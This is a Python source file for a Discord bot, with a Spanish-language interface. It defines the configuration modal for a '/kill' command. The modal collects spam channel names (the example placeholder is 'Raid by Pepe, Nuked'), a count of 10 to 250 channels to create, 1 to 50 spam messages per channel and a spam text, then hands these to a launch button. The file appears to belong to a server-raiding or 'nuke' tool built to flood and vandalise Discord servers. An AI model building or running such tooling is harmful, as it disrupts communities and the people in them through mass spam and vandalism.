import datetime

from nextcord import Embed, Interaction, Color, Guild, TextInputStyle
from nextcord.ui import Modal, TextInput
from nextcord.ext import commands

from config.config_handler import ConfigHandler
from components.buttons.kill_buttons import KillButtons
from utils.server_utils import ServerUtils

class KillModel(Modal):
    
    config_handler = ConfigHandler()
    utils = ServerUtils()
    
    def __init__(self, guild: Guild, bot: commands.Bot):
        super().__init__(
            title = "Configuración del comando /kill",
            timeout = 300)
        
        self.guild = guild
        self.bot = bot
        
        self.channel_name = TextInput(
            label = "Nombres de los canales de spam",
            min_length = 1,
            max_length = 100,
            required = True,
            default_value = self.config_handler.get_channels_names()[0],
            placeholder = "Separados por comas, ejemplo: Raid by Pepe, Nuked.")
        
        self.quantity_channels = TextInput(
            label = "Cantidad de canales",
            min_length = 2,
            max_length = 3,
            required = True,
            default_value = self.config_handler.get_number_channels(),
            placeholder = "La cantidad de canales que creará el bot (10-250). ")
        
        self.quantity_messages = TextInput(
            label = "Cantidad de mensajes por canal.",
            min_length = 1,
            max_length = 2,
            required = True,
            default_value = self.config_handler.get_messages_per_channel(),
            placeholder = "La cantidad de mensajes que enviará el bot en cada canal (1-50). ")
        
        self.message = TextInput(
            label = "Mensaje de spam",
            min_length = 1,
            max_length = 200,
            required = True,
            style = TextInputStyle.paragraph,
            default_value = self.config_handler.get_message(),
            placeholder = "El mensaje que spameará el bot.")
        
        self.add_item(self.channel_name)
        self.add_item(self.quantity_channels)
        self.add_item(self.quantity_messages)
        self.add_item(self.message)
        
    async def callback(self, ctx: Interaction) -> None:
        
        spam_message = self.message.value
        channels_names = self.channel_name.value.split(",")
        quantity_ch = int(self.quantity_channels.value)
        quantity_mg = int(self.quantity_messages.value)
        
        if quantity_ch < 10 or quantity_ch > 250:
            raise ValueError
        
        if quantity_mg < 1 or quantity_mg > 50:
            raise ValueError
        
        start_embed = Embed(
            title = "✅ |Da clic en el botón con '🚀' para iniciar la acción.",
            timestamp = datetime.datetime.now(),
            color = Color.blurple())

        view = KillButtons(guild = self.guild,
                            bot = self.bot,
                            message = spam_message,
                            channels_names = channels_names, 
                            quantity_channels = quantity_ch,
                            quantity_messages = quantity_mg)
        
        await ctx.response.send_message(embed = start_embed, view = view)